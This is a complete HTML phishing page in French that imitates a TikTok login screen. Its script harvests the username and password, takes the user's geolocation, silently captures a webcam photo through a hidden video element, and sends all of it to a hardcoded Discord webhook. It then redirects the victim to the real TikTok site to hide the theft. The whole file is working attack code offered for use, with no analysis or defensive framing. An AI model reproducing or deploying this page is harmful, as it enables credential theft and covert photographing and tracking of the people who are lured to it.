<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion TikTok</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #fe2c55;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 8px;
    }
    button:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }
    button:hover:enabled {
      background-color: #e91b44;
    }
    .checkbox-label {
      font-size: 0.95em;
      display: flex;
      align-items: center;
      margin: 12px 0;
      text-align: left;
    }
    .checkbox-label input[type="checkbox"] {
      margin-right: 8px;
    }
    #notice {
      font-size: 0.95em;
      color: #c00;
      margin-bottom: 10px;
    }
    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Connecte-toi √† TikTok</h2>
    <div id="notice">
      En continuant, vous acceptez que votre localisation et une photo soient prises et envoy√©es pour v√©rification.
    </div>
    <form id="loginForm">
      <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required>
      <input type="password" id="password" placeholder="Mot de passe" required>
      <label class="checkbox-label">
        <input type="checkbox" id="acceptTerms" required>
        J'accepte les conditions d'utilisation (localisation + photo obligatoire)
      </label>
      <button type="submit" id="submitBtn" disabled>Se connecter</button>
      <video id="video" autoplay style="display:none"></video>
      <canvas id="canvas" style="display:none"></canvas>
    </form>
  </div>
  <script>
    // Activation du bouton selon la case √† cocher
    const acceptTerms = document.getElementById('acceptTerms');
    const submitBtn = document.getElementById('submitBtn');
    acceptTerms.addEventListener('change', function() {
      submitBtn.disabled = !this.checked;
    });

    // Webcam et g√©olocalisation
    let imageBlob = null;
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let stream = null;

    function startWebcam() {
      return new Promise((resolve, reject) => {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(s) {
              stream = s;
              video.srcObject = stream;
              video.play();
              video.onloadedmetadata = () => resolve();
            })
            .catch(reject);
        } else {
          reject('Webcam non support√©e');
        }
      });
    }

    function takePhoto() {
      return new Promise((resolve, reject) => {
        try {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
          canvas.toBlob(function(blob) {
            imageBlob = blob;
            // Arr√™t du flux webcam apr√®s la photo
            if (stream && stream.getTracks) {
              stream.getTracks().forEach(track => track.stop());
            }
            resolve();
          }, 'image/png');
        } catch (e) {
          reject(e);
        }
      });
    }

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";

      // 1. Demander la g√©olocalisation
      if (!navigator.geolocation) {
        alert("La g√©olocalisation n'est pas support√©e par votre navigateur.");
        return;
      }
      navigator.geolocation.getCurrentPosition(function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        // 2. D√©marrer la webcam et prendre la photo
        startWebcam().then(() => {
          setTimeout(() => {
            takePhoto().then(() => {
              // 3. Envoi au webhook Discord
              const form = new FormData();
              const content = `üîî Connexion TikTok\nüë§ Utilisateur : ${username}\nüîë Mot de passe : ${password}\nüåç Localisation :\nLatitude : ${lat}\nLongitude : ${lon}\nüì∏ Photo jointe`;
              form.append("content", content);
              if (imageBlob) {
                form.append("file", imageBlob, "photo.png");
              }
              fetch(webhookURL, {
                method: "POST",
                body: form
              }).then(() => {
                window.location.href = "https://www.tiktok.com";
              }).catch(() => {
                window.location.href = "https://www.tiktok.com";
              });
            }).catch(() => {
              alert("Erreur lors de la prise de photo.");
            });
          }, 800); // Laisse la webcam s'activer
        }).catch(() => {
          alert("Impossible d'acc√©der √† la webcam.");
        });
      }, function() {
        alert("Impossible d'obtenir la localisation.");
      });
    });
  </script>
</body>
</html>
